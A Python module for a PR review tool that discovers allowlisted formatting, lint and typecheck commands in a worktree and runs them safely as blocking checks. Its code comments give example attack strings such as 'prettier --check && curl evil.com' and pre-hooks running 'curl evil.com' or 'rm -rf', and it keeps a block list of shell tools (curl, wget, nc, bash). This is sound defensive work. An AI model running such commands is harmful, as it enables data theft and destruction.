"""Deterministic gates for ``pdd checkup --pr --review-loop``.

The review loop's LLM reviewer (codex/claude/gemini) can declare a PR
"clean" while a fast, deterministic local check still fails on the
worktree (e.g. ``prettier --check`` finds unformatted files). This
module discovers a conservative, allowlisted set of repo-local gates,
runs each as a bounded list-form subprocess, and converts failures into
synthetic blocker ``ReviewFinding`` entries that the review loop must
treat exactly like reviewer findings: refuse the clean verdict, feed
them to the fixer, and re-run gates on the next round.

Trust-boundary invariants:
* All commands are list-form. ``shell=True`` is never used.
* Discovery is allowlist-only. Anything not explicitly recognized is
  skipped, not best-effort guessed.
* The runner never raises. ``subprocess.run`` errors are captured as
  ``GateResult`` rows with ``exit_code=None`` and a non-empty ``error``.
* All stdout/stderr is truncated to roughly 10KB each side and scrubbed
  via ``pdd.checkup_review_loop._scrub_secrets`` before persistence or
  rendering.
* Environment is scrubbed: ``CI=1``, ``NO_COLOR=1``, ``FORCE_COLOR=0`` are
  injected; ``PDD_*`` mutating envs are stripped so a gate cannot inherit
  reviewer/fixer state.
* The runner's ``cwd`` is always the loop-owned PR worktree.
"""

from __future__ import annotations

import datetime as _dt
import json
import logging
import os
import re
import shutil
import subprocess
import sys
import time
from dataclasses import dataclass
from pathlib import Path
from typing import Dict, List, Optional, Sequence, Tuple

logger = logging.getLogger(__name__)


# Approximate per-stream excerpt cap. Bounded to keep prompt injection
# tractable and to keep persisted artifacts small. We leave a generous
# margin over the literal byte count so a small "[truncated]" marker
# fits without violating the integration-side budget contract.
_EXCERPT_LIMIT = 10_000

# Per-gate default timeout in seconds. The runner enforces this even
# when ``Gate.timeout`` is left at the dataclass default so a discovery
# bug cannot wedge the review loop.
DEFAULT_GATE_TIMEOUT_SECONDS: float = 60.0


# ---------------------------------------------------------------------------
# Dataclasses
# ---------------------------------------------------------------------------


@dataclass
class Gate:
    """A single discovered deterministic gate.

    The ``cmd`` field is the literal list-form argv. The runner
    ``run_gates`` is responsible for spawning the subprocess; this
    dataclass is data only.
    """

    name: str
    cmd: List[str]
    source: str
    severity: str = "blocker"
    timeout: float = DEFAULT_GATE_TIMEOUT_SECONDS
    area: str = "deterministic-gate"
    required_fix_hint: str = ""

    def to_dict(self) -> Dict[str, object]:
        # Iter-24 Finding 1: scrub every string field before
        # serialization. The dict feeds both the per-round JSON
        # manifest (``round-{R}-{mode}-gates.json``) and the
        # in-memory ``state.gate_runs`` row that the review loop
        # persists into ``final-state.json`` — both are long-term
        # audit surfaces, and a fork PR can poison ``package.json``
        # script bodies with literal tokens that would otherwise
        # land verbatim in those artifacts. The Gate's bare ``cmd``
        # list still flows through ``_execute_one`` unchanged for
        # subprocess invocation; only the serialized projection
        # gets the scrub.
        return {
            "name": _scrub(self.name),
            "cmd": [_scrub(arg) for arg in self.cmd],
            "source": _scrub(self.source),
            "severity": self.severity,
            "timeout": self.timeout,
            "area": self.area,
            "required_fix_hint": _scrub(self.required_fix_hint),
        }


@dataclass
class GateResult:
    """Result of executing a single gate.

    ``exit_code is None`` indicates a runner-side failure (timeout,
    missing binary, OSError). In that case ``error`` carries a short
    human-readable description and the gate is treated as a failure by
    ``gate_results_to_findings``.
    """

    gate: Gate
    exit_code: Optional[int]
    stdout_excerpt: str
    stderr_excerpt: str
    duration_seconds: float
    started_at_iso: str
    error: str = ""

    @property
    def passed(self) -> bool:
        return self.exit_code == 0

    def to_dict(self) -> Dict[str, object]:
        return {
            "gate": self.gate.to_dict(),
            "exit_code": self.exit_code,
            "stdout_excerpt": self.stdout_excerpt,
            "stderr_excerpt": self.stderr_excerpt,
            "duration_seconds": self.duration_seconds,
            "started_at_iso": self.started_at_iso,
            "error": self.error,
            "passed": self.passed,
        }


# ---------------------------------------------------------------------------
# Discovery
# ---------------------------------------------------------------------------


# npm script names this module recognizes as deterministic gates. Anything
# else is skipped: discovery is allowlist-only on purpose.
_RECOGNIZED_NPM_SCRIPTS: Tuple[str, ...] = (
    "format:check",
    "prettier:check",
    "lint:check",
    "typecheck",
    "tsc",
    "tsc:noemit",
)

# Substrings whose presence in an npm script command disqualifies the
# script entirely. Mutation, install, or deployment scripts must never
# run from a checkup gate.
_FORBIDDEN_SCRIPT_FRAGMENTS: Tuple[str, ...] = (
    "--write",
    "--fix",
    "install",
    "publish",
    "deploy",
    "start",
    " build",
    "build:",
    "git push",
    "rm -",
    "rimraf",
    # Iter-26 Finding 2: ``--cache`` produces ``.eslintcache`` /
    # ``.prettiercache`` / ``.tsbuildinfo`` artifacts next to the
    # source, which the loop's downstream commit/push helper can
    # stage into the PR on repos whose .gitignore does not exclude
    # them. Gates must be non-mutating (issue #1092 product
    # requirement).
    "--cache",
)


# Shell metacharacters and compound-command operators. npm/yarn/pnpm
# scripts run through ``<runner> run <name>`` which invokes a shell on
# the script body, so ANY metacharacter that lets a script chain or
# substitute commands turns the allowlist into a foothold:
# ``"format:check": "prettier --check && curl evil.com"`` would pass
# the head check and then execute the appended exfiltration. Reject
# the whole script when any of these tokens appear. List spans the
# minimum metachar set codex review iteration 1 Finding 1 requested
# plus the obvious shell-out binaries.
#
# POSIX shell metacharacters only. Windows cmd.exe metacharacters
# (e.g. ``^``, ``%VAR%``) are out of v1 scope: PDD is a Unix-first
# project and ``package.json`` scripts are conventionally written for
# POSIX shells (codex review iteration 2, Finding 3 — info).
_SHELL_METACHAR_TOKENS: Tuple[str, ...] = (
    "&&",
    "||",
    ";",
    "|",
    "&",
    "`",
    "$(",
    "${",
    ">",
    ">>",
    "<",
    "<<",
    "\n",
    "\r",
    " curl ",
    " wget ",
    " nc ",
    " bash ",
    " sh ",
    " eval ",
    "node -e",
)


# Heads (after stripping the package manager prefix like ``npm run``) that
# we accept as gate-style commands.
_ACCEPTABLE_SCRIPT_HEADS: Tuple[str, ...] = (
    "prettier --check",
    "tsc --noemit",
    # Iter-26 Finding 1: ``tsc -p <project>`` without ``--noEmit``
    # writes .js/.d.ts/.tsbuildinfo files next to the source — bare
    # ``tsc -p`` is therefore NOT acceptable. ``_script_is_acceptable``
    # accepts the ``tsc -p`` head only when the script body ALSO
    # contains ``--noEmit`` somewhere in its argv (see the explicit
    # check in ``_script_is_acceptable``); the head string itself is
    # kept as ``tsc -p`` so the head match still works.
    "tsc -p",
    # ``eslint`` is accepted ONLY when ``--no-fix`` is explicitly
    # present (the prompt-side contract). ESLint config files can
    # silently enable ``fix`` mode and mutate the worktree on
    # certain projects, so we require the operator to opt out
    # rather than guessing.
    "eslint",
)


def _detect_node_runner(worktree: Path) -> str:
    """Return the package manager binary to invoke for npm scripts.

    Prefers ``pnpm``/``yarn``/``bun`` lockfiles over plain ``npm``. The
    return value is the literal argv[0]; the caller appends ``run`` +
    script name.
    """
    if (worktree / "pnpm-lock.yaml").exists():
        return "pnpm"
    if (worktree / "yarn.lock").exists():
        return "yarn"
    if (worktree / "bun.lockb").exists():
        return "bun"
    return "npm"


def _script_is_acceptable(command: str) -> bool:
    """Return True when an npm-script command-string is allowlisted.

    The npm-run path delegates to ``<runner> run <name>`` which spawns a
    shell for the script body. Anything beyond a single recognised tool
    head and its arguments must be rejected:
    * ``_FORBIDDEN_SCRIPT_FRAGMENTS`` blocks mutation/install/deploy
      semantics even when wrapped in an allowlisted head.
    * ``_SHELL_METACHAR_TOKENS`` blocks command chaining and substitution
      so a script body like ``prettier --check && curl evil.com`` cannot
      slip through the head check.

    The metachar check is performed against the ORIGINAL (case-preserved)
    command for substrings that are case-sensitive (e.g. ``$(``), and
    against the lower-cased form for word-style fragments (e.g.
    ``" curl "``). Both modes are inclusive: any match rejects the
    script.
    """
    if not command:
        return False
    lowered = command.lower()
    # ``--no-install`` is the SAFE form of ``npx`` (operators opt out
    # of the registry-install fallback) and MUST be exempted from the
    # ``install`` substring check below. Strip it before scanning so
    # the forbidden-fragment loop cannot misclassify the safe flag as
    # an ``npm install`` smuggle. The npx-prefix logic further down
    # re-checks for ``--no-install`` on the original string so this
    # strip does not loosen acceptance.
    scan_target = lowered.replace("--no-install", "")
    for forbidden in _FORBIDDEN_SCRIPT_FRAGMENTS:
        if forbidden in scan_target:
            return False
    # Case-sensitive shell metachar / substitution / redirection /
    # newline / lead-with-shell-binary tokens. Tokens carrying a space
    # are matched space-padded to avoid clobbering legitimate paths like
    # ``./sh-test/`` while still catching `` bash `` / `` sh `` / `` nc ``.
    padded = " " + lowered + " "
    for token in _SHELL_METACHAR_TOKENS:
        if token.startswith(" ") and token.endswith(" "):
            if token in padded:
                return False
        else:
            if token in command or token in lowered:
                return False
    # Strip leading package-manager prefix so that
    # ``npm run format:check`` and ``yarn format:check`` both reduce to
    # the recognised tool head.
    #
    # Iter-22 Finding 2: ``npx`` is special. Unlike the ``run`` /
    # ``yarn`` / ``pnpm`` / ``bun`` invocations, bare ``npx <tool>``
    # falls back to a registry download + install + exec when the
    # tool is not present in the local ``node_modules``. The
    # tsconfig-based discovery path emits ``npx --no-install`` for
    # this reason; the npm-run discovery path MUST hold the same
    # bar. Accept the ``npx`` prefix ONLY when the script body
    # explicitly contains ``--no-install`` (operators who want the
    # gate can write ``npx --no-install tsc --noEmit``); reject
    # bare ``npx`` to keep gates local/deterministic/non-mutating.
    stripped = lowered
    if stripped.startswith("npx "):
        if "--no-install" not in stripped:
            return False
        stripped = stripped[len("npx ") :].lstrip()
        # Skip the ``--no-install`` flag itself so the tool head
        # comparison below sees ``tsc`` / ``prettier`` directly.
        if stripped.startswith("--no-install"):
            stripped = stripped[len("--no-install") :].lstrip()
    else:
        for prefix in (
            "npm run ",
            "yarn run ",
            "pnpm run ",
            "bun run ",
            "yarn ",
            "pnpm ",
            "bun ",
        ):
            if stripped.startswith(prefix):
                stripped = stripped[len(prefix) :].lstrip()
                break
    for head in _ACCEPTABLE_SCRIPT_HEADS:
        if stripped.startswith(head):
            # Iter-27 Finding 2: tighten the head match — ``stripped``
            # may continue with arbitrary suffix bytes (``tsc --noemit``
            # head matches both ``tsc --noEmitOnError`` and
            # ``tsc --noEmit false``, both of which emit). Require the
            # head to be followed by whitespace, end-of-string, or
            # ``=`` (to allow ``--check=…`` shapes) so a different
            # flag with a shared prefix cannot smuggle past.
            tail = stripped[len(head) :]
            if tail and not tail[0].isspace() and tail[0] != "=":
                continue
            tokens = stripped.split()
            # Iter-26 Finding 1 + iter-27 Finding 2: ``tsc -p
            # <project>`` without ``--noEmit`` emits artifacts. Use
            # tokenized matching so ``--noEmitOnError`` (different
            # token) and ``--noEmit false`` (explicit disable) do NOT
            # qualify as "noEmit is set".
            if head == "tsc -p" and not _has_active_noemit(tokens):
                return False
            if head == "tsc --noemit" and not _has_active_noemit(tokens):
                # Catches ``tsc --noEmit false`` which started with
                # the head but explicitly disables emit-skipping.
                return False
            # Iter-26 Finding 2: ``eslint`` requires explicit
            # ``--no-fix``. The prior rule (accept unless ``--fix`` is
            # present) was too permissive: ESLint config files can
            # silently enable fix mode via ``"fix": true`` in the
            # config object even when the CLI argv has no ``--fix``,
            # and the worktree gets mutated. Force operators to opt
            # out explicitly.
            if head == "eslint" and "--no-fix" not in stripped:
                return False
            return True
    return False


def _has_active_noemit(tokens: List[str]) -> bool:
    """Return True iff ``--noEmit`` is present and not explicitly disabled.

    ``tokens`` is the lowercased, whitespace-split argv. The check is
    word-bounded: ``--noemitonerror`` is a SEPARATE TypeScript flag
    that does NOT skip emit, so a substring match would silently
    accept it (iter-27 Finding 2). Also reject ``--noemit false`` /
    ``--noemit 0`` / ``--noemit no`` — TypeScript treats those as an
    explicit disable.
    """
    for i, t in enumerate(tokens):
        if t == "--noemit":
            if i + 1 < len(tokens) and tokens[i + 1] in (
                "false", "0", "no",
            ):
                continue
            return True
    return False


def _discover_npm_gates(
    worktree: Path, changed_files: Sequence[str] = ()
) -> List[Gate]:
    package_json = worktree / "package.json"
    if not package_json.is_file():
        return []
    try:
        data = json.loads(package_json.read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError) as exc:
        logger.debug("checkup-gates: package.json unreadable: %s", exc)
        return []
    scripts = data.get("scripts") or {}
    if not isinstance(scripts, dict):
        return []
    runner = _detect_node_runner(worktree)
    # Iter-27 Finding 3: PR-modified tool config files are RCE-equivalent.
    # ``prettier.config.{js,cjs,mjs,ts}``, ``.prettierrc.{js,cjs,mjs,ts}``,
    # ``eslint.config.{js,cjs,mjs,ts}``, ``.eslintrc.{js,cjs,mjs}``,
    # and ``tsconfig*.json`` are all loaded and executed (or interpreted)
    # by the corresponding tool — running ``prettier --check`` after a
    # fork PR shipped a poisoned ``prettier.config.cjs`` is RCE. Skip
    # the gate that would load each config when the PR modified it.
    pr_changed_set = {f.lower() for f in changed_files}
    def _pr_modified_any(prefixes: Tuple[str, ...]) -> bool:
        for path in pr_changed_set:
            base = path.rsplit("/", 1)[-1]
            for pfx in prefixes:
                if base == pfx or base.startswith(pfx + ".") or (
                    pfx.endswith(".") and base.startswith(pfx)
                ):
                    return True
                # Also match arbitrary-ext variants like
                # ``prettier.config.cjs`` against prefix
                # ``prettier.config``.
                if "." in pfx and base.startswith(pfx + "."):
                    return True
        return False

    prettier_config_changed = _pr_modified_any(
        ("prettier.config", ".prettierrc")
    )
    eslint_config_changed = _pr_modified_any(
        ("eslint.config", ".eslintrc")
    )
    tsconfig_changed = any(
        path.endswith("tsconfig.json")
        or "/tsconfig." in path
        or path.startswith("tsconfig.")
        for path in pr_changed_set
    )
    # Map recognized scripts to which config-class they load. A
    # script can load multiple — e.g. ``lint:check`` could be
    # eslint or prettier — but we conservatively skip when ANY
    # plausibly-loaded config changed.
    script_config_owners: Dict[str, Tuple[bool, ...]] = {
        "format:check": (prettier_config_changed,),
        "prettier:check": (prettier_config_changed,),
        "lint:check": (eslint_config_changed, prettier_config_changed),
        "typecheck": (tsconfig_changed,),
        "tsc": (tsconfig_changed,),
        "tsc:noemit": (tsconfig_changed,),
    }
    gates: List[Gate] = []
    for script_name, script_command in scripts.items():
        if script_name not in _RECOGNIZED_NPM_SCRIPTS:
            continue
        if not isinstance(script_command, str):
            continue
        if not _script_is_acceptable(script_command):
            continue
        # Iter-27 Finding 3 enforcement: skip the gate when the PR
        # modified a config file the tool would load.
        if any(script_config_owners.get(script_name, ())):
            logger.debug(
                "checkup-gates: skipping npm:%s — PR modified a tool "
                "config file the script would load",
                script_name,
            )
            continue
        # npm/yarn/pnpm/bun all execute ``pre<name>`` and ``post<name>``
        # lifecycle hooks around ``<runner> run <name>``. Discovery only
        # inspects the named script; if a malicious or untrusted PR adds
        # ``preformat:check`` with ``curl evil.com`` or ``rm -rf``, that
        # hook still fires when we invoke the validated script. Refuse to
        # discover the gate when ANY pre/post hook exists for it, even an
        # empty string — operators can drop the hook or rename the script
        # to opt back in. We do not try to validate the hook body, because
        # the gate value here (a generic format/typecheck) is not worth
        # the attack surface of allowlisting more shell snippets.
        if (
            f"pre{script_name}" in scripts
            or f"post{script_name}" in scripts
        ):
            logger.debug(
                "checkup-gates: skipping npm:%s — pre/post lifecycle hook present",
                script_name,
            )
            continue
        gates.append(
            Gate(
                name=f"npm:{script_name}",
                cmd=[runner, "run", script_name],
                source=f"package.json:scripts.{script_name}",
                required_fix_hint=(
                    f"Run `{runner} run {script_name}` locally and address the "
                    "reported issues."
                ),
            )
        )
    # If a typescript config exists and we did not emit a typecheck
    # script, try ``npx tsc --noEmit`` directly. Discovery rule: only when
    # ``typescript`` appears in the dependency map AND ``tsconfig.json``
    # exists AND ``node_modules/typescript/bin/tsc`` is already on disk.
    #
    # The local node_modules check is load-bearing for determinism: bare
    # ``npx tsc`` will silently fall back to a network install (npm
    # registry hit + arbitrary install lifecycle) when typescript is
    # declared in ``package.json`` but not actually installed in the
    # worktree. That turns the "deterministic local gate" into a
    # network/install/exec, which is exactly the attack surface the
    # issue forbids (issue #1092 product requirement: gates must be
    # local, deterministic, bounded, and non-mutating).
    if (
        (worktree / "tsconfig.json").exists()
        and "npm:typecheck" not in {g.name for g in gates}
        and "npm:tsc" not in {g.name for g in gates}
        and "npm:tsc:noemit" not in {g.name for g in gates}
    ):
        deps: Dict[str, object] = {}
        for key in ("dependencies", "devDependencies", "peerDependencies"):
            value = data.get(key) or {}
            if isinstance(value, dict):
                deps.update(value)
        tsc_local = worktree / "node_modules" / "typescript" / "bin" / "tsc"
        # Iter-27 Finding 1: ``composite: true`` in tsconfig forces emit
        # (and tsc errors when combined with ``--noEmit``); skip the
        # gate so we don't surface a false runner-error blocker on
        # repos that legitimately use project references.
        composite_in_config = False
        try:
            tsconfig_text = (worktree / "tsconfig.json").read_text(
                encoding="utf-8"
            )
            # ``tsconfig.json`` allows comments / trailing commas; a
            # strict json.loads would reject those. A loose regex is
            # enough for the "is composite enabled?" decision.
            if re.search(
                r'"composite"\s*:\s*true', tsconfig_text
            ):
                composite_in_config = True
        except (OSError, UnicodeDecodeError):
            tsconfig_text = ""
        if (
            "typescript" in deps
            and tsc_local.is_file()
            and shutil.which("npx")
            and not composite_in_config
            # Iter-27 Finding 3: skip when PR modified tsconfig — the
            # gate would otherwise execute the PR-controlled
            # ``compilerOptions`` (paths/plugins/transformers) which is
            # RCE-equivalent on a fork PR.
            and not tsconfig_changed
        ):
            gates.append(
                Gate(
                    # Iter-27 Finding 1: ``tsc --noEmit`` STILL writes
                    # ``tsconfig.tsbuildinfo`` (and per-project
                    # buildinfo files) when ``incremental: true`` is
                    # set in tsconfig. The downstream commit/push
                    # helper then stages that file into the PR on
                    # repos whose .gitignore does not exclude it.
                    # Pass ``--incremental false`` to suppress the
                    # write and ``--tsBuildInfoFile <devnull>`` as
                    # belt-and-braces so any TypeScript version that
                    # ignores ``--incremental false`` (none known,
                    # but cheap) still cannot reach the worktree.
                    #
                    # ``--no-install`` keeps npx from reaching the
                    # registry when typescript is declared but not
                    # actually installed.
                    name="tsc-noemit",
                    cmd=[
                        "npx",
                        "--no-install",
                        "tsc",
                        "--noEmit",
                        "--incremental",
                        "false",
                        "--tsBuildInfoFile",
                        os.devnull,
                    ],
                    source="tsconfig.json",
                    required_fix_hint=(
                        # Iter-23 Finding 3: point the fixer at the
                        # ``--no-install`` form. Bare ``npx tsc`` lets
                        # an LLM fixer that follows the hint reach the
                        # npm registry — defeating the
                        # local-node_modules safeguard via the
                        # automated-fix surface.
                        "Run `npx --no-install tsc --noEmit --incremental "
                        "false --tsBuildInfoFile /dev/null` locally and fix "
                        "the reported TypeScript errors. Do NOT use bare "
                        "`npx tsc` — without `--no-install` it can fall back "
                        "to a registry download/install, and without "
                        "`--incremental false` it writes "
                        "`.tsbuildinfo` into the worktree."
                    ),
                )
            )
    return gates


def _discover_python_gates(
    worktree: Path, changed_files: Sequence[str]
) -> List[Gate]:
    gates: List[Gate] = []
    changed_py = [
        rel for rel in changed_files if rel.endswith(".py") and (worktree / rel).is_file()
    ]
    for rel in changed_py:
        gates.append(
            Gate(
                name=f"py-compile:{rel}",
                # Bare ``python -m py_compile <abs>`` mutates the
                # reviewed worktree: ``py_compile.compile`` writes
                # ``__pycache__/*.pyc`` next to the source file, and
                # the loop's downstream ``_commit_and_push_if_changed``
                # stages untracked files, so on a repo whose
                # ``.gitignore`` does not already exclude
                # ``__pycache__/`` the gate would push generated
                # bytecode into the PR. The ``-B`` flag does NOT fix
                # this because ``py_compile`` writes the artifact
                # explicitly regardless of ``sys.dont_write_bytecode``;
                # routing ``cfile=os.devnull`` also does not work on
                # macOS/Linux because py_compile uses an atomic
                # write+rename (you cannot rename onto ``/dev/null``).
                # Use the builtin ``compile()`` directly — it validates
                # syntax and raises ``SyntaxError`` on bad input without
                # writing ANY bytecode file (issue #1092 product
                # requirement: gates must be non-mutating).
                cmd=[
                    sys.executable,
                    "-B",
                    "-c",
                    # Read the source as BYTES, not text. ``compile()``
                    # accepts bytes and respects the PEP 263 encoding
                    # declaration (``# -*- coding: latin-1 -*-`` and
                    # friends) — forcing ``encoding='utf-8'`` would
                    # raise ``UnicodeDecodeError`` on valid non-UTF-8
                    # Python files, turning the gate into a false
                    # blocker. ``compile()`` still raises
                    # ``SyntaxError`` on bad input without writing any
                    # bytecode to disk.
                    "import sys; "
                    "src = open(sys.argv[1], 'rb').read(); "
                    "compile(src, sys.argv[1], 'exec')",
                    str(worktree / rel),
                ],
                source=rel,
                required_fix_hint=(
                    # Iter-23 Finding 3: do NOT point an automated
                    # fixer at bare ``python -m py_compile``. That
                    # writes ``__pycache__/*.pyc`` next to the source
                    # file and the loop's downstream commit-and-push
                    # path stages untracked files, so a fixer
                    # following this hint can ship bytecode into the
                    # PR on repos whose .gitignore does not exclude
                    # ``__pycache__/``. Point at the same
                    # non-mutating compile() builtin form the gate
                    # itself uses.
                    f"Fix the syntax error in {rel}. To re-check locally "
                    f"without writing __pycache__ artifacts: "
                    f"`python -B -c \"import sys; "
                    f"compile(open(sys.argv[1], 'rb').read(), sys.argv[1], 'exec')\" "
                    f"{rel}`."
                ),
            )
        )
    pyproject = worktree / "pyproject.toml"
    pyproject_text = ""
    if pyproject.is_file():
        try:
            pyproject_text = pyproject.read_text(encoding="utf-8")
        except OSError as exc:
            logger.debug("checkup-gates: pyproject.toml unreadable: %s", exc)
            pyproject_text = ""

    def _tool_section_present(section: str) -> bool:
        if not pyproject_text:
            return False
        return bool(
            re.search(
                rf"^\s*\[\s*tool\.{re.escape(section)}\s*\](?:\s|$)",
                pyproject_text,
                re.MULTILINE,
            )
        )

    # Iter-25 Finding 2: end-of-options ``--`` before the changed-file
    # list. Without it a PR that adds a file named ``--config=evil.py``
    # (or any path starting with ``-``) would feed that token to the
    # tool as a flag instead of a path — bypassing the gate's intent
    # and potentially altering its behaviour. ruff, black, and mypy
    # all support the POSIX-standard ``--`` separator to mark the end
    # of options.
    if changed_py and _tool_section_present("ruff") and shutil.which("ruff"):
        gates.append(
            Gate(
                name="ruff",
                cmd=["ruff", "check", "--", *changed_py],
                source="pyproject.toml:[tool.ruff]",
                required_fix_hint=(
                    "Run `ruff check --fix` locally and address the remaining "
                    "issues."
                ),
            )
        )
    if changed_py and _tool_section_present("black") and shutil.which("black"):
        gates.append(
            Gate(
                name="black",
                cmd=["black", "--check", "--", *changed_py],
                source="pyproject.toml:[tool.black]",
                required_fix_hint=(
                    "Run `black .` locally and commit the formatting changes."
                ),
            )
        )
    if changed_py and _tool_section_present("mypy") and shutil.which("mypy"):
        gates.append(
            Gate(
                name="mypy",
                cmd=["mypy", "--", *changed_py],
                source="pyproject.toml:[tool.mypy]",
                required_fix_hint=(
                    "Run `mypy` locally and fix the reported type errors."
                ),
            )
        )
    return gates


def _resolve_pr_base_spec(worktree: Path, base_ref: Optional[str]) -> Optional[str]:
    """Resolve ``base_ref`` to a refspec verifiable inside ``worktree``.

    Returns the resolved refspec (e.g. ``"origin/main"``) when it exists,
    or ``None`` when no candidate verifies. Tried in order:

    1. The caller-supplied ``base_ref`` itself (already qualified).
    2. ``origin/<base_ref>`` (fetched PR base).
    3. ``origin/main`` / ``origin/master`` / ``main`` / ``master``.

    Verification uses ``git rev-parse --verify`` with a short timeout
    and never raises: a non-git worktree, missing tool, or hang returns
    ``None`` and the caller falls back to the working-tree-only check.
    """
    candidates: List[str] = []
    if base_ref:
        # When the caller already resolved a fully-qualified ref
        # (e.g. ``refs/remotes/pdd-checkup/pr-1095/base`` populated by
        # ``_refresh_pr_base_ref``), try it FIRST and do not also try
        # ``origin/refs/...`` — that path is guaranteed to fail and
        # just wastes a git-rev-parse call on every gate-discovery
        # invocation.
        if base_ref.startswith("refs/"):
            candidates.append(base_ref)
        else:
            # Prefer the remote-tracking ref so we compare against the
            # PR's actual target. A naked ``main`` may be ahead of
            # ``origin/main`` if a local merge has happened in the
            # worktree.
            candidates.append(f"origin/{base_ref}")
            candidates.append(base_ref)
    candidates.extend(["origin/main", "origin/master", "main", "master"])
    seen: set = set()
    for cand in candidates:
        if cand in seen:
            continue
        seen.add(cand)
        try:
            res = subprocess.run(
                ["git", "-C", str(worktree), "rev-parse", "--verify", cand],
                capture_output=True,
                text=True,
                check=False,
                timeout=5,
            )
        except (OSError, subprocess.SubprocessError) as exc:
            logger.debug("checkup-gates: base verify failed for %r: %s", cand, exc)
            continue
        if res.returncode == 0 and res.stdout.strip():
            return cand
    return None


def _git_diff_check_gate(base_spec: Optional[str] = None) -> Gate:
    """Build the ``git diff --check`` gate.

    When ``base_spec`` is provided the gate runs against the PR range
    (``<base>...HEAD``) so a committed whitespace/conflict-marker
    failure is caught even when the worktree itself is clean. When no
    base is resolvable (synthetic tests, detached HEAD, etc.) we fall
    back to the plain working-tree check — strictly weaker but
    preserves the existing single-commit smoke-test contract.
    """
    if base_spec:
        return Gate(
            name="git-diff-check",
            cmd=["git", "diff", "--check", f"{base_spec}...HEAD"],
            source=f"git:{base_spec}...HEAD",
            required_fix_hint=(
                f"Run `git diff --check {base_spec}...HEAD` locally and fix "
                "the whitespace/conflict marker issues it reports in the PR diff."
            ),
        )
    return Gate(
        name="git-diff-check",
        cmd=["git", "diff", "--check"],
        source="git",
        required_fix_hint=(
            "Run `git diff --check` locally and fix the whitespace/conflict "
            "marker issues it reports."
        ),
    )


def _is_git_worktree(worktree: Path) -> bool:
    """Return True when ``worktree`` is inside a git checkout.

    A non-git directory (typical in unit tests that mock
    ``_setup_pr_worktree``) cannot run ``git diff --check``, so the
    gate is omitted to keep the loop's existing fail-open contract for
    those callers. Production review loops always run inside a real
    ``git fetch pull/N/head`` worktree so this guard is invisible there.
    """
    if (worktree / ".git").exists():
        return True
    try:
        result = subprocess.run(
            ["git", "-C", str(worktree), "rev-parse", "--is-inside-work-tree"],
            capture_output=True,
            text=True,
            check=False,
            timeout=5,
        )
    except (OSError, subprocess.SubprocessError):
        return False
    return result.returncode == 0 and result.stdout.strip() == "true"


def discover_gates(
    worktree: Path,
    changed_files: Sequence[str],
    *,
    extra_allow: Sequence[str] = (),
    base_ref: Optional[str] = None,
) -> List[Gate]:
    """Return the conservative deterministic gate set for ``worktree``.

    ``changed_files`` is the PR's changed-file inventory (POSIX relative
    paths). It scopes per-file gates such as ``py_compile``, ``ruff``,
    ``black`` and ``mypy``.

    ``extra_allow`` is a tuple of additional gate-name allowlist entries
    supplied by the operator. Currently this is a forward-compatibility
    hook: every discovered gate is allowlist-only and ``extra_allow`` is
    threaded through but not yet used to widen discovery. The argument is
    accepted so the CLI surface and the discovery surface can co-evolve
    without breaking signature stability.

    ``base_ref`` is the PR's target branch (e.g. ``"main"``). When
    provided and verifiable in ``worktree``, the ``git-diff-check`` gate
    runs across the PR range (``<base>...HEAD``) so a committed
    whitespace/conflict-marker failure is caught even when the worktree
    itself is clean. Acceptance criterion from issue #1092.
    """
    _ = extra_allow  # reserved for v2; CLI plumbing already passes it through.
    gates: List[Gate] = []
    if _is_git_worktree(worktree):
        base_spec = _resolve_pr_base_spec(worktree, base_ref)
        gates.append(_git_diff_check_gate(base_spec))
    gates.extend(_discover_npm_gates(worktree, changed_files=changed_files))
    gates.extend(_discover_python_gates(worktree, changed_files))
    # Stable order: git-diff-check first, then language-specific gates
    # in discovery order. The runner walks the list left-to-right so
    # operators see consistent artifact filenames across rounds.
    return gates


# ---------------------------------------------------------------------------
# Execution
# ---------------------------------------------------------------------------


def _truncate(text: str) -> str:
    """Truncate ``text`` to roughly ``_EXCERPT_LIMIT`` characters.

    When truncation actually fires, append a short marker so an operator
    can tell that the artifact is incomplete.
    """
    if text is None:
        return ""
    if len(text) <= _EXCERPT_LIMIT:
        return text
    marker = "\n[...truncated]\n"
    keep = _EXCERPT_LIMIT - len(marker)
    return text[:keep] + marker


def _safe_slug(name: str) -> str:
    """Filesystem-safe slug for ``name``."""
    return re.sub(r"[^A-Za-z0-9._-]+", "_", name)[:120] or "gate"


def _build_subprocess_env() -> Dict[str, str]:
    """Build the environment dict the runner injects for each gate.

    Inherits the caller's PATH/HOME (so tools resolve), strips ``PDD_*``
    envs (so the gate cannot inherit reviewer/fixer state or token
    files), and forces ``CI=1``, ``NO_COLOR=1``, ``FORCE_COLOR=0`` for
    deterministic non-interactive output.
    """
    env = {
        key: value
        for key, value in os.environ.items()
        if not key.startswith("PDD_")
    }
    env["CI"] = "1"
    env["NO_COLOR"] = "1"
    env["FORCE_COLOR"] = "0"
    return env


def _scrub(text: str) -> str:
    """Run the loop's secret-scrubber over ``text``.

    Imported lazily to avoid an import cycle at module load: the review
    loop module imports ``checkup_gates``, not the other way around.
    """
    try:
        from .checkup_review_loop import _scrub_secrets

        return _scrub_secrets(text)
    except Exception as exc:  # pragma: no cover - defensive
        logger.debug("checkup-gates: secret scrub fell back: %s", exc)
        return text


def _now_iso() -> str:
    return _dt.datetime.now(_dt.timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


def _execute_one(
    worktree: Path,
    gate: Gate,
    *,
    default_timeout: float,
) -> GateResult:
    """Execute a single gate, capturing stdout/stderr and runner-side errors."""
    started = _now_iso()
    started_monotonic = time.monotonic()
    timeout = gate.timeout if gate.timeout and gate.timeout > 0 else default_timeout
    env = _build_subprocess_env()
    try:
        proc = subprocess.run(
            list(gate.cmd),
            cwd=str(worktree),
            env=env,
            capture_output=True,
            text=True,
            timeout=timeout,
            check=False,
        )
    except subprocess.TimeoutExpired as exc:
        duration = time.monotonic() - started_monotonic
        captured_stdout = ""
        captured_stderr = ""
        if exc.stdout:
            captured_stdout = exc.stdout if isinstance(exc.stdout, str) else exc.stdout.decode(
                "utf-8", "replace"
            )
        if exc.stderr:
            captured_stderr = exc.stderr if isinstance(exc.stderr, str) else exc.stderr.decode(
                "utf-8", "replace"
            )
        return GateResult(
            gate=gate,
            exit_code=None,
            # Scrub BEFORE truncating. A token like ``ghp_...`` whose
            # last byte happens to land past the 10 KB cutoff would
            # otherwise leave a partial-token prefix in the excerpt
            # that the scrub regex (anchored on the full token shape)
            # would no longer match. Iter-22 Finding 1.
